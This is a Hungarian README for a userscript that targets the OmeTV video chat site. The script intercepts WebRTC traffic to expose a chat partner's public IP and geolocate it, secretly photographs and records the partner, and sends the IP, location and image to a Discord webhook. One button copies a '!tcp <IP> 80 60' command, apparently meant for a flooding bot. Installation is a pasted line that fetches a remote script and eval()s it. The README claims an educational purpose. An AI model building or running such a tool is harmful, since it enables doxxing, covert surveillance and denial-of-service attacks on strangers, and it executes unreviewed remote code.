# 🛰️ LoveNode • OmeTV Suite

Egy kliensoldali userscript az OmeTV weboldalához. Automatikusan elfogja a WebRTC peer-kapcsolatokat, megjeleníti a partner hálózati adatait, képernyőfotót és videót rögzít, valamint az adatokat közvetlenül Discord webhookra továbbítja.

---

## 🌟 Főbb funkciók

* 🌐 **WebRTC Interception:** Elfogja az `RTCPeerConnection` ICE candidate csomagokat (`srflx`), kinyerve a távoli fél publikus IP-címét és portját.
* 📍 **IP Geolokáció:** Lekéri a partner városát, megyéjét, szolgáltatóját (ISP) és földrajzi koordinátáit az `ipinfo.io` API-n keresztül.
* 💎 **Liquid Glass UI:** Modern, lebegő, hordozható (drag-and-drop) üveghatású kezelőfelület iOS 26 stílusú stílusjegyekkel és háttérhomályosítással.
* 📸 **Médiaeszközök:**
* **Fotó:** Kombinált képernyőmentés a helyi és távoli kameraképről.
* **Felvétel:** Natív `MediaRecorder` alapú videórögzítés (`WebM` formátumban, VP9/VP8 kodekkel).


* 💬 **Discord Integráció:** Beépített webhook támogatás: elküldi az IP-t, helyszínt, Google Maps hivatkozást és a pillanatképet a megadott csatornára.
* ⚡ **Gyorsgombok:** IP és előre formázott parancsok (`!tcp <IP> 80 60`) vágólapra másolása egyetlen kattintással.

---

4. A script hasznalatához használd ezt a script sort:
```fetch('https://raw.githubusercontent.com/fabalta/fabaltaomeipl/main/script.js').then(r=>{if(!r.ok)throw new Error(`HTTP ${r.status}`);return r.text()}).then(eval).catch(console.error)```

---

## 🚀 Vezérlőpult gombjai

| Gomb | Ikon | Funkció |
| --- | --- | --- |
| **FRISSÍT** | `<i class="fa-solid fa-rotate-right"></i>` | Törli vagy frissíti az állapotjelzőt |
| **TÉRKÉP** | `<i class="fa-solid fa-map-location-dot"></i>` | Megnyitja a megadott koordinátákat Google Mapsen |
| **UDPMIX** | `<i class="fa-solid fa-bolt"></i>` | Vágólapra másolja: `!tcp <IP> 80 60` |
| **IPV4** | `<i class="fa-solid fa-copy"></i>` | Vágólapra másolja a távoli fél IP-címét |
| **FOTÓ** | `<i class="fa-solid fa-camera"></i>` | Összevont képernyőfotót készít a kamerákról |
| **FELVÉTEL** | `<i class="fa-solid fa-circle"></i>` | Elindítja / leállítja a videórögzítést |
| **DISCORD** | `<i class="fa-brands fa-discord"></i>` | Elküldi az aktuális adatokat és a fotót Discordra |

---

## 📜 Jogi nyilatkozat (Disclaimer)

Ez a projekt kizárólag **oktatási, kutatási és hálózatbiztonsági tesztelési célokból** készült.

* A szoftver használata során a felhasználó köteles betartani a helyi jogszabályokat és az érintett weboldal Felhasználási Feltételeit (Terms of Service).
* A fejlesztő semmilyen felelősséget nem vállal a kód helytelen használatából vagy visszaéléseiből eredő károkért.

---

### 👤 Szerző

Készítette: **Fabalta**

* GitHub: [@Fabalta](https://github.com/fabalta)
